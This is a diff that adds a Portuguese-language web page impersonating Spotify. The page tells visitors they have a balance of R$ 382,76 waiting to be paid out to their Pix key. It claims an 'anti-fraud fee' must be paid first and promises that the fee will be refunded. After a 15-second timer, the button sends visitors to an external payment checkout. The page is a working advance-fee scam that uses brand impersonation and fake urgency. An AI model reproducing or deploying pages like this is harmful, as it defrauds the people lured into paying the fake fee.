@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify</title>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            justify-content: space-around;
+            display: flex;
+            flex-direction: column;
+            background-color: rgb(24, 24, 24);
+            align-items: center;    /* Centraliza verticalmente */
+          }
+          .centralizado {
+            margin-top: 70px;
+            width: 300px;
+            background-color: rgb(0, 0, 0);
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 10px;
+          }
+          *{
+            font-family: "Poppins", sans-serif;
+            color: white;
+            padding: 0px;
+          }
+          #logocentral{
+            width: 90px;
+          }
+          #textoprincipalsptfy{
+            font-size: 23px;
+            margin: 20px 0px;
+            font-weight: 700;
+          }
+          #descricaoiniciospotify{
+            color: rgb(168, 168, 168);
+            margin-top: -10px;
+            margin-bottom: -10px;
+            font-size: 14px;
+          }
+          #descricaoiniciospotifyy{
+            color: rgb(168, 168, 168);
+            font-size: 14px;
+            font-weight: 500;
+          }
+          #divisorlinha{
+            width: 95%;
+            height: 1px;
+            background-color: rgb(105, 105, 105);
+          }
+          #txtinputmeil{
+            color: rgb(168, 168, 168);
+          }
+          #logincadastro{
+            display: flex;
+            font-size: 15px;
+            width: 100%;
+            flex-direction: column;
+            text-align: left;
+          }
+          #inputcadastro, #nomeInput{
+            padding: 13px 10px;
+            color: rgb(168, 168, 168);
+            border-radius: 5px;
+            margin-top: 5px;
+            width: 100%;
+            border: 1px solid rgb(168, 168, 168);
+            background-color: rgb(24, 24, 24);
+          }
+          #meuBotao{
+            padding: 13px 10px;
+            background-color: gray;
+            color: white;
+            margin-top: 20px;
+            border-radius: 50px;
+            border: 1px solid gray;
+            text-decoration: none;
+            width: 90%;
+            font-weight: 600;
+          }
+
+        /* Estilo após a mudança de cor */
+        .verde {
+            background-color: rgb(1, 214, 97);
+            cursor: pointer; /* Muda o cursor para indicar que agora é clicável */
+        }
+          #topoFixo {
+            position: fixed;
+            top: 0; /* Define a posição no topo da página */
+            left: 0; /* Alinha à esquerda */
+            width: 100%; /* Faz a div ocupar toda a largura da página */
+            background-color: #000000; /* Cor de fundo (verde) */
+            color: white; /* Cor do texto */
+            padding: 15px 10px;
+            align-items: center;
+            display: flex;
+            justify-content: space-between;
+            text-align: center; /* Centraliza o texto */
+        }
+        #logo{
+            width: 130px;
+        }
+        #saldoatual{
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin-right: 20px;
+            background-color: rgb(7, 187, 52);
+        }
+        #txtnotificacao{
+            color: white;
+        }
+        #notificacao{
+            background-color: rgba(1, 214, 97, 0.434);
+            display: flex;
+            margin-top: -10px;
+            align-items: center;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            justify-content: center;
+            width: 100%;
+            border-radius: 10px;
+            border: 1px solid rgb(1, 214, 97);
+        }
+    </style>
+</head>
+<body>
+    <!-- TOPO FIXO -->
+    <div id="topoFixo">
+        <img src="images/logo.png" id="logo">
+        <div id="saldoatual">
+            Saldo: R$ 382,76
+        </div>
+    </div>
+
+    <div class="centralizado">
+        <!-- IMAGEM DA LOGO -->
+        <img src="images/logowhite.png" id="logocentral">
+
+        <!-- TEXTO POP UP -->
+        <div id="textoprincipalsptfy">
+            Parabéns, <b id="mensagem">...</b>!
+        </div>
+         
+        <div id="notificacao">
+           <p id="txtnotificacao">Enviando <b>R$ 382,76</b> para a chave pix <b id="pix">.</b></p>
+        </div>
+
+         <!-- DESCRICAO -->
+          <p id="descricaoiniciospotify">
+            Usamos uma taxa <b>anti-fraudes,</b> para evitar fraudes e abuso dos saques que estavam ocorrendo dentro do <b>sistema.</b><br><br>
+
+Fique tranquilo, voce recebera o valor <br>da taxa <b>de volta junto ao valor do seu saque,</b> e apenas uma etapa <br>de validamento de que voce seria um humano e nao um robo. <br><br> Seu Saldo está retido, é possível usar parte do seu saldo para cobrir até 50% do valor da taxa, saindo de R$ 39,80 para <b>R$ 19,90</b>
+          </p>
+
+            <button onclick="redirecionar()" id="meuBotao" disabled="">LIBERANDO SAQUE...</button>
+
+            <script>
+                // Função para obter o parâmetro da URL
+                function obterParametroDaUrl(nome) {
+                    const urlParams = new URLSearchParams(window.location.search); // Obtém os parâmetros da URL
+                    return urlParams.get(nome); // Retorna o valor do parâmetro especificado
+                }
+        
+                // Obtém os valores dos parâmetros "nome" e "pix"
+                const nome = obterParametroDaUrl('nome');
+                const pix = obterParametroDaUrl('pix');
+        
+                // Exibe os valores no HTML
+                if (nome) {
+                    document.getElementById('mensagem').innerText = `${nome}`;
+                    document.getElementById('pix').innerText = `${pix}`;
+                }
+                if (pix) {
+                    document.getElementById('pix').innerText = `${pix}`;
+                }
+            </script>
+
+            <script>
+                // Função para mudar a cor do botão e da borda, além de habilitar o redirecionamento
+                function mudarBotao() {
+                    const botao = document.getElementById('meuBotao');
+                    botao.style.backgroundColor = 'rgb(1, 214, 97)';  // Altera a cor do fundo diretamente
+                    botao.style.borderColor = 'rgb(1, 214, 97)';  // Altera a cor da borda diretamente
+                    botao.style.cursor = 'pointer';  // Muda o cursor para indicar que agora é clicável
+                    botao.innerText = 'FINALIZAR VERIFICAÇÃO E RECEBER';  // Altera o texto do botão
+                    botao.disabled = false;  // Habilita o botão para ser clicado
+        
+                    // Adiciona o redirecionamento ao clicar no botão
+                    botao.onclick = function() {
+                        window.location.href = "https://pay.bullspagamentos.xyz/checkout/2d62cae9-c1d9-49aa-9d17-134aaf70147d"; // URL para onde redirecionar
+                    };
+                }
+        
+                // Temporizador de 10 segundos para chamar a função mudarBotao
+                setTimeout(mudarBotao, 15000);  // 10000 milissegundos = 10 segundos
+            </script>
+
+            <p id="descricaoiniciospotifyy">
+                Este site é protegido pelo reCAPTCHA e está sujeito �&nbsp; <b style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b> e aos <b style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+            </p>
+      </div>
+
+</body></html>
